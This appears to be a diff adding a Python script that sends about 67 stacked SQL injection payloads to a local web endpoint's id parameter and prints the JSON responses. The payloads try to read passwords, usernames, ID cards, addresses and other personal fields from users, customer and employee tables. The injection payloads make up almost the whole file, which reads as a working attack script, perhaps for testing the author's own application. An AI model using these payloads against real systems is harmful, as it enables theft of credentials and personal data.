@@ -1,0 +1,80 @@
+import requests
+
+data_set = ["\"; SELECT email FROM customer#",
+            "\"; SELECT * FROM service# ",
+            "\"; SELECT fname, tel, customer_id, lname FROM customer# ",
+            "\"; SELECT * FROM users-- ",
+            "\"; SELECT tel, customer_id, email FROM customer#",
+            "\"; SELECT fname, customer_id, email FROM customer#",
+            "\"; SELECT password FROM users#",
+            "\"; SELECT username FROM users-- ",
+            "\"; SELECT lname, email, customer_id FROM customer-- ",
+            "\"; SELECT * FROM users# ",
+            "\"; SELECT * FROM customer#",
+            "\"; SELECT tel, customer_id, fname FROM customer# ",
+            "\"; SELECT house_registration, employee_id FROM employee-- ",
+            "\"; SELECT * FROM service-- ",
+            "\"; SELECT customer_id, fname, tel, lname FROM customer# ",
+            "\"; SELECT email, lname FROM employee#",
+            "\"; SELECT tel, id_card, graduation_certificate FROM employee# ",
+            "\"; SELECT email, customer_id, fname, tel FROM customer#",
+            "\"; SELECT price FROM service#",
+            "\"; SELECT password FROM users-- ",
+            "\"; SELECT name FROM service# ",
+            "\"; SELECT tel, customer_id, fname, email FROM customer#",
+            "\"; SELECT fname FROM customer# ",
+            "\"; SELECT * FROM service#",
+            "\"; SELECT lname, email, fname FROM customer-- ",
+            "\"; SELECT * FROM users#",
+            "\"; SELECT tel, lname FROM customer#",
+            "\"; SELECT fname, nickname, address, employee_id, email FROM employee# ",
+            "\"; SELECT id_card, tel, graduation_certificate, lname, house_registration FROM employee#",
+            "\"; SELECT id_card, employee_id, nickname, prefixname, fname FROM employee-- ",
+            "\"; SELECT prefixname, nickname, lname, address, email, tel, work_background, employee_id FROM employee# ",
+            "\"; SELECT name FROM service#",
+            "\"; SELECT work_background, prefixname, tel, nickname FROM employee#",
+            "\"; SELECT price FROM service# ",
+            "\"; SELECT prefixname, email, work_background, id_card, fname, address, nickname, lname FROM employee# ",
+            "\"; SELECT price FROM service-- ",
+            "\"; SELECT * FROM customer# ",
+            "\"; SELECT work_background, lname, nickname, graduation_certificate, house_registration, prefixname, fname, address FROM employee#",
+            "\"; SELECT email, fname, house_registration FROM employee#",
+            "\"; SELECT lname FROM employee#",
+            "\"; SELECT username FROM users#",
+            "\"; SELECT * FROM employee# ",
+            "\"; SELECT prefixname, address, house_registration, nickname, id_card, fname FROM employee# ",
+            "\"; SELECT fname, work_background, id_card, house_registration, employee_id, address, prefixname, email, lname, tel FROM employee-- ",
+            "\"; SELECT username FROM users# ",
+            "\"; SELECT prefixname, graduation_certificate, id_card, fname, work_background, nickname, tel, email, lname, house_registration, employee_id FROM employee-- ",
+            "\"; SELECT tel, customer_id FROM customer-- ",
+            "\"; SELECT email, id_card, graduation_certificate FROM employee#",
+            "\"; SELECT * FROM customer-- ",
+            "\"; SELECT lname, email, customer_id, fname FROM customer# ",
+            "\"; SELECT id_card, employee_id FROM employee# ",
+            "\"; SELECT customer_id, lname FROM customer-- ",
+            "\"; SELECT lname, email, tel FROM customer# ",
+            "\"; SELECT customer_id FROM customer-- ",
+            "\"; SELECT tel, customer_id FROM customer#",
+            "\"; SELECT fname, tel, prefixname FROM employee# ",
+            "\"; SELECT customer_id, email FROM customer-- ",
+            "\"; SELECT lname, fname, tel FROM customer# ",
+            "\"; SELECT nickname, lname, work_background, prefixname, email, employee_id, graduation_certificate, house_registration, fname, tel FROM employee-- ",
+            "\"; SELECT id_card FROM employee# ",
+            "\"; SELECT work_background, email, address, lname, fname, house_registration FROM employee-- ",
+            "\"; SELECT lname, fname, email FROM customer-- ",
+            "\"; SELECT lname, tel, customer_id, email FROM customer# ",
+            "\"; SELECT email, tel FROM customer#",
+            "\"; SELECT work_background FROM employee# ",
+            "\"; SELECT tel, email, prefixname, house_registration, id_card, employee_id, work_background, fname, address, nickname FROM employee# "]
+
+
+def fetch_data(data):
+    response = requests.get(
+        f"http://localhost:3000/employee?id={data}")
+    json = response.json()
+    print(json)
+
+
+for data in data_set:
+    # print(data)
+    fetch_data(data)
